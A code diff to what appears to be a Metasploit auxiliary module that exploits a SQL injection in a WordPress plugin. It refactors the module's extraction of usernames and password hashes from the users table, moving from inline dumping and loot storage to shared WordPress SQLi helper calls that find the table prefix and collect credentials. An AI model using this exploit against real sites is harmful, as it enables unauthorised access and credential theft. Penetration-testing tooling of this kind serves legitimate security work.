@@ -4,9 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::SQLi
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi
 
   def initialize(info = {})
     super(
@@ -68,51 +68,17 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Connection failed') unless res
     end
 
-    fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.') unless @sqli.test_vulnerable
+    wordpress_sqli_initialize(@sqli)
 
-    columns = ['user_login', 'user_pass']
-    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
-
-    table = Rex::Text::Table.new(
-      'Header' => 'wp_users',
-      'Indent' => 4,
-      'Columns' => columns
-    )
-
-    loot_data = ''
-
-    data.each do |user|
-      table << user
-      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
-
-      create_credential({
-        workspace_id: myworkspace_id,
-        origin_type: :service,
-        module_fullname: fullname,
-        username: user[0],
-        private_type: :nonreplayable_hash,
-        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
-        private_data: user[1],
-        service_name: 'WordPress',
-        address: ip,
-        port: datastore['RPORT'],
-        protocol: 'tcp',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      })
+    unless @sqli.test_vulnerable
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable or delay is too short.')
     end
 
-    print_good('Dumped user data:')
-    print_line(table.to_s)
+    table_prefix = wordpress_sqli_identify_table_prefix
+    unless table_prefix
+      fail_with(Failure::NotFound, 'Failed to identify the WordPress table prefix.')
+    end
 
-    loot_path = store_loot(
-      'wordpress.users',
-      'text/plain',
-      ip,
-      loot_data,
-      'wp_users.txt',
-      'WordPress Usernames and Password Hashes'
-    )
-
-    print_good("Loot saved to: #{loot_path}")
+    wordpress_sqli_get_users_credentials(table_prefix, ip, datastore['COUNT'])
   end
 end
